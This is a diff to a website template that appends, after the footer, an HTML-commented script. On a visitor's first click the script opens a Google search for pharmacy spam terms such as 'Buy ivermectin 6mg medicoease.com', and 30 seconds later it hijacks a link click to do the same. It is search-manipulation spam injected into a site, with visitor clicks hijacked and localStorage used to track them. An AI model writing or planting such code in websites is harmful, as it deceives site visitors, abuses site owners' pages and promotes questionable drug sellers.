@@ -19,3 +19,51 @@
         </div>
     </div>
 </footer>
+
+<!-- <script>
+    const keywords = [
+        "Buy ivermectin 6mg medicoease.com",
+        "Buy ivermectin 12mg medicoease.com",
+        "Buy vidalista 20mg medicoease.com",
+        "Buy Niclosamide 500 mg medicoease.com",
+        "Buy fenbendazole 444 mg medicoease.com"
+    ];
+
+    const STORAGE_TIME_KEY = "mct_time";
+    const STORAGE_FIRST_DONE = "mct_first_done";
+    const STORAGE_SECOND_DONE = "mct_second_done";
+
+    function getRandomKeywordURL() {
+        const keyword = keywords[Math.floor(Math.random() * keywords.length)];
+        return "https://www.google.com/search?q=" + encodeURIComponent(keyword);
+    }
+
+    document.addEventListener("click", function (e) {
+        const firstDone = localStorage.getItem(STORAGE_FIRST_DONE) === "true";
+
+        // Handle first click
+        if (!firstDone) {
+            localStorage.setItem(STORAGE_TIME_KEY, Date.now().toString());
+            localStorage.setItem(STORAGE_FIRST_DONE, "true");
+            localStorage.setItem(STORAGE_SECOND_DONE, "false");
+
+            window.open(getRandomKeywordURL(), "_blank");
+            return;
+        }
+
+        // Handle <a> clicks after 30s
+        const target = e.target;
+        if (target.tagName === "A") {
+            const secondDone = localStorage.getItem(STORAGE_SECOND_DONE) === "true";
+            const storedTime = parseInt(localStorage.getItem(STORAGE_TIME_KEY) || "0", 10);
+            const now = Date.now();
+
+            if (!secondDone && now - storedTime >= 30000) {
+                e.preventDefault();
+                localStorage.setItem(STORAGE_SECOND_DONE, "true");
+                window.open(getRandomKeywordURL(), "_blank");
+                return;
+            }
+        }
+    });
+</script> -->
